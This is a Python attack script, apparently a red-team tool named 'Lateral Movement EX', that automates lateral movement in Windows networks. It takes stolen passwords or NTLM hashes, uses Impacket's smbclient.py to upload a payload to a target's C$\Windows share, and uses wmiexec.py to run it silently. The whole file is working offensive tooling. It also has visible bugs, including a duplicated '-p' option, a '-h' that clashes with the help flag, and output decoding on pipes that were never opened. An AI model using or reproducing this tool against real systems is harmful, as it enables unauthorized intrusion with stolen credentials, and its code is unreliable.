#!/usr/bin/env python3

import subprocess
import os
from rich.console import Console
import argparse

console = Console()

parser = argparse.ArgumentParser(
                    prog='Lateral Movement EX',
                    description='Automates lateral movement with smbclient and wmiexec',
                    epilog='Please visit HexRav3n for more info')
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=False)
parser.add_argument('-h','--hash', help='Hash value to set', required=False)
parser.add_argument('-d','--domain', help='Domain value to set', required=True)
parser.add_argument('-t','--target', help='Target', required=True)
parser.add_argument('-p','--payload', help='Target', required=True)
args = parser.parse_args()



def upload_file(payload, target, domain, user, hash):
    console.log(f"[white] [+] Uploading payload: {payload} to {target}")
    if hash:        
        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}@{target} -hashes :{hash} -no-pass -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}:{password}@{target} -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    stdout, stderr = smbclient.communicate()

    print(stdout.decode(), stderr.decode())

def execute_payload(payload, target, domain, user, hash):
    console.log(f"[white] [+] Executing payload: {payload} to {target}")
    if hash:
        wmiexec = subprocess.Popen(f"wmiexec.py -silentcommand -nooutput -hashes :{hash} -no-pass {domain}/{user}@{target} \"cmd.exe /c mmc.exe C:\Windows\{payload}\"")
    else:
        wmiexec = subprocess.Popen(f"wmiexec.py -silentcommand -nooutput {domain}/{user}:{password}@{target} \"cmd.exe /c mmc.exe C:\Windows\{payload}\"")

    stdout, stderr = wmiexec.communicate()

    print(stdout.decode(), stderr.decode())

if __name__ == "__main__":
    console.log("[red] [+] Lateral Movement EX")

    user = args.user
    password = args.password
    hash = args.hash
    domain = args.domain
    target = args.target
    payload = args.payload
    
    smb_commands = ["use C$\n", "cd c:\Windows\n", f"put {payload}\n"]

    if os.path.exists("smbcommands.txt"):
        os.remove("smbcommands.txt")

    console.log("[white] [+] Generating smbcommands file")
    with open("smbcommands.txt", "w") as file:
        file.writelines(smb_commands)

    upload_file(payload, target, domain, user, hash)

    execute_payload(payload, target, domain, user, hash)

    console.log("[Green] [+] Payload execution complete!")

    console.log("[white] [+] Cleaning up....")

    os.remove("smbcommands.txt")
